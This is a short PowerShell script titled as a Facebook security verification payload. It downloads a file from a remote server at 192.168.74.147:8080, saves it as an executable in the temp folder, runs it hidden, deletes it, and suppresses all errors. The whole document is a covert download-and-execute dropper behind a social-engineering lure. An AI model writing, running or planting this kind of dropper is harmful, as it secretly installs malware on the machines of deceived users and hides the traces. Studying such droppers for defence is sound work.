# Facebook Security Verification Payload
$ErrorActionPreference = 'SilentlyContinue'

# Download and execute
$url = "http://192.168.74.147:8080/payloads/config.dat"
$temp = "$env:TEMP\fbsec.exe"

try {
    # Download
    Invoke-WebRequest -Uri $url -OutFile $temp -UseBasicParsing
    
    # Execute
    Start-Process -FilePath $temp -WindowStyle Hidden
    
    # Cleanup
    Start-Sleep -Seconds 3
    Remove-Item $temp -Force -ErrorAction SilentlyContinue
    
} catch {
    # Silent fail
}
